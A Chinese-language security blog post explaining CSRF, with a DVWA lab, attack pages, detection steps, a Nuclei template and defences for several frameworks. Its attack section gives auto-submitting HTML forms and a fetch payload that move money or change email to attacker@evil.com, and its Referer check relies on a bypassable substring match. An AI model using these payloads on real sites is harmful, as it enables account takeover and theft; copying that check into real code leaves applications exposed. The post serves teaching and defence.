---
title: "CSRF 漏洞复现 - 从原理到防御实战"
date: 2026-03-01T13:00:00+08:00
draft: false
categories: ['漏洞复现']
tags: ['CSRF', 'Web 安全', '漏洞复现']
image: "/blog-cover-default.jpg"
---

# CSRF 漏洞复现 - 从原理到防御实战

## 📋 漏洞概述

**漏洞名称**: Cross-Site Request Forgery (CSRF)  
**漏洞类型**: 跨站请求伪造  
**危害等级**: 🟠 中高危  
**常见场景**: 状态修改操作（转账、改密、删数据）

---

## 🎯 漏洞原理

### 什么是 CSRF？

CSRF（跨站请求伪造）是一种攻击方式，攻击者诱导已认证用户在不知情的情况下执行非预期操作。

**核心前提**:
- 用户已登录目标网站
- 网站使用 Cookie 自动认证
- 请求无其他验证机制

### 攻击流程

```
1. 用户登录 bank.com (获得认证 Cookie)
2. 用户访问 attacker.com (恶意网站)
3. attacker.com 自动提交转账请求到 bank.com
4. 浏览器自动携带 Cookie
5. bank.com 认为这是用户的合法请求
6. 转账成功，用户不知情
```

---

## 🧪 漏洞环境搭建

### 目标应用

```bash
# DVWA CSRF 环境
docker run -d -p 8080:80 vulnerables/web-dvwa
```

### 漏洞点识别

**存在 CSRF 的操作**:
- ✅ 修改密码
- ✅ 转账汇款
- ✅ 删除账户
- ✅ 修改邮箱
- ❌ 查询余额（无状态改变）

---

## ⚔️ 漏洞利用

### 1️⃣ GET 请求 CSRF

**目标接口**:
```http
GET /change-email?email=attacker@evil.com HTTP/1.1
Host: bank.com
Cookie: session=abc123
```

**攻击页面**:
```html
<html>
  <body onload="document.forms[0].submit()">
    <form action="https://bank.com/change-email" method="GET">
      <input type="hidden" name="email" value="attacker@evil.com">
    </form>
  </body>
</html>
```

### 2️⃣ POST 请求 CSRF

**目标接口**:
```http
POST /transfer HTTP/1.1
Host: bank.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

amount=1000&to=attacker@evil.com
```

**攻击页面 (自动提交)**:
```html
<html>
  <body onload="document.forms[0].submit()">
    <form action="https://bank.com/transfer" method="POST">
      <input type="hidden" name="amount" value="1000">
      <input type="hidden" name="to" value="attacker@evil.com">
    </form>
  </body>
</html>
```

### 3️⃣ JSON 请求 CSRF

**目标接口**:
```http
POST /api/transfer HTTP/1.1
Host: bank.com
Content-Type: application/json
Cookie: session=abc123

{"amount": 1000, "to": "attacker@evil.com"}
```

**攻击页面 (使用 Fetch)**:
```html
<script>
  fetch('https://bank.com/api/transfer', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({amount: 1000, to: 'attacker@evil.com'})
  });
</script>
```

**注意**: 需要目标允许 CORS 或禁用 `Content-Type` 检查

### 4️⃣ 高级利用技巧

#### 结合 XSS

```
XSS → 窃取 CSRF Token → 构造合法请求
```

#### 点击劫持 + CSRF

```html
<iframe src="https://bank.com/transfer" style="opacity:0;position:absolute;top:0;left:0;">
</iframe>
<div style="position:absolute;top:100px;left:100px;">
  <h1>点击领取奖品!</h1>
</div>
```

#### 移动端 CSRF

```html
<!-- 利用微信/支付宝 URL Scheme -->
<a href="alipays://platformapi/startapp?appId=xxx&action=transfer&to=attacker">
  点击领取红包
</a>
```

---

## 🔍 漏洞检测

### 检测步骤

1. **识别状态修改操作**
   - 查找 POST/PUT/DELETE 请求
   - 检查是否修改数据

2. **检查 Token 机制**
   - 请求中是否有 CSRF Token
   - Token 是否可预测/可绕过

3. **验证 Referer 检查**
   - 修改 Referer 头测试
   - 移除 Referer 头测试

4. **检查 SameSite Cookie**
   ```
   Set-Cookie: session=abc; SameSite=Lax
   ```

### Burp Suite 检测

1. 捕获修改密码请求
2. 发送至 Repeater
3. 移除 CSRF Token（如果有）
4. 修改 Origin/Referer
5. 观察是否成功

### Nuclei 模板

```yaml
id: csrf-detection
info:
  name: CSRF Detection
  severity: medium
  tags: csrf

requests:
  - method: POST
    path:
      - "{{BaseURL}}/change-email"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "email=test@test.com"
    matchers:
      - type: word
        words:
          - "email changed"
          - "success"
      - type: word
        part: header
        words:
          - "csrf"
        negative: true
```

---

## 🛡️ 防御方案

### 1️⃣ CSRF Token (推荐)

**服务端生成**:
```python
import secrets

def generate_csrf_token():
    return secrets.token_hex(32)

# 存入 session
session['csrf_token'] = generate_csrf_token()
```

**表单嵌入**:
```html
<form method="POST" action="/transfer">
  <input type="hidden" name="csrf_token" value="{{ session.csrf_token }}">
  <input type="text" name="amount">
  <input type="submit" value="转账">
</form>
```

**服务端验证**:
```python
@app.route('/transfer', methods=['POST'])
def transfer():
    token = request.form.get('csrf_token')
    if token != session.get('csrf_token'):
        abort(403)
    # 处理转账
```

### 2️⃣ SameSite Cookie

```http
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

**SameSite 选项**:
- `Strict`: 所有跨站请求不发送 Cookie
- `Lax`: 仅安全导航（GET）发送 Cookie
- `None`: 所有请求都发送（需配合 Secure）

### 3️⃣ Referer/Origin 验证

```python
@app.before_request
def check_referer():
    if request.method in ['POST', 'PUT', 'DELETE']:
        referer = request.headers.get('Referer')
        origin = request.headers.get('Origin')
        
        if not referer or 'bank.com' not in referer:
            abort(403)
```

### 4️⃣ 二次验证

**敏感操作要求**:
- 重新输入密码
- 短信验证码
- 邮箱确认链接

### 5️⃣ 自定义 Header

```javascript
// 前端添加自定义 Header
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': token,
    'X-Requested-With': 'XMLHttpRequest'
  }
});
```

**注意**: 需要 CORS 配置允许该 Header

---

## 📊 真实案例分析

### 案例 1: 某银行转账漏洞

**漏洞点**: 转账接口无 CSRF Token  
**利用**: 构造恶意页面诱导用户访问  
**影响**: 用户资金被盗转

### 案例 2: 社交账号接管

**漏洞点**: 修改邮箱接口存在 CSRF  
**利用**: 修改受害者邮箱 → 密码重置 → 账号接管  
**影响**: 百万用户账号风险

### 案例 3: 路由器配置篡改

**漏洞点**: 管理后台无 CSRF 防护  
**利用**: 修改 DNS 服务器 → 流量劫持  
**影响**: 内网用户流量被监控

---

## 🎯 框架内置防护

### Django

```python
# 自动启用 CSRF 保护
MIDDLEWARE = [
    'django.middleware.csrf.CsrfViewMiddleware',
]

# 模板中自动添加 Token
{% csrf_token %}
```

### Laravel

```php
// 自动验证 CSRF Token
// Blade 模板
@csrf

// 或手动验证
if (!hash_equals($sessionToken, $requestToken)) {
    abort(403);
}
```

### Spring Security

```java
@EnableWebSecurity
public class SecurityConfig {
    protected void configure(HttpSecurity http) {
        http.csrf().csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse());
    }
}
```

### Express (csurf 中间件)

```javascript
const csurf = require('csurf');
const csrfProtection = csurf({ cookie: true });

app.use(csrfProtection);

app.post('/transfer', (req, res) => {
  // Token 自动验证
});
```

---

## 🎓 学习资源

- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger CSRF Labs](https://portswigger.net/web-security/csrf)
- [PayloadsAllTheThings CSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection)

---

**标签**: #CSRF #Web 安全 #漏洞复现 #SRC #渗透测试
